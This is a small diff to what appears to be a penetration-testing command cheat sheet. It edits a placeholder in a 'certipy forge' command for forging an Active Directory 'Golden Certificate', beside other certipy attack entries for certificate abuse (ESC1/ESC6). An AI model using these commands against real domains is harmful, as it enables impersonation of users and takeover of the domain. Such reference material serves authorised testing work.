@@ -35,7 +35,7 @@ certipy ca -u '<user>@<domain>' -p '<password>' -ns '<nameserver>' -target '<dom
 ## certipy - Golden Certificate - forge certificate
 #plateform/linux #target/remote #cat/ATTACK
 ```
-certipy forge -ca-pfx 'ca-pfx-file' -upn '<user>@<domain>' -sid '<sid>' -crl 'ldap:///'
+certipy forge -ca-pfx '<ca-pfx-file>' -upn '<user>@<domain>' -sid '<sid>' -crl 'ldap:///'
 ```
 
 ## certipy - request certificate for another user - ESC1 - ESC6
